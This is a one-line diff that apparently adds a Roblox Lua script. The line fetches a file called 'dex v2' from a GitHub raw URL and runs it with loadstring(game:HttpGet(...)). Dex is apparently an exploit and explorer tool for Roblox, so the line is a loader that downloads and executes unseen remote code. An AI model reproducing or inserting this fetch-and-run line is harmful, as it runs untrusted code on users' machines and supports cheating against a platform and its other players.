@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/harisprofanny/main/dex%20v2.txt"))()
